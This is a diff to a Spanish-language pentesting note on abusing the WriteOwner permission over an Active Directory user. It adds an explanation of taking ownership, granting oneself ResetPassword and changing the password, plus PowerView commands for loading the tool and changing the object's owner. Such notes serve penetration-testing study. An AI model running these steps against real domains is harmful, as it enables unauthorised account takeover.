@@ -4,13 +4,15 @@ Tags: #AD #ACL #Windows
 
 ## WriteOwner sobre Usuario 
 
-```bash 
+Si tenemos esta ACL sobre un usuario, podemos cambiar el propietario del objeto. Una vez que somos propietarios, podemos modificar la ACL del usuario para otorgarnos ResetPassword y así cambiar su contraseña.
+
+```powershell 
 Paso 1:
 # Cargar PowerView a la máquina víctima 
 ❯ Import-Module .\PowerView.ps1
 ```
 
-```bash 
+```powershell 
 Paso 2:
 # Cambiar el propietario del objeto
 ❯ Set-DomainObjectOwner -Identity "TargetUser" -OwnerIdentity "ControlledAccount"
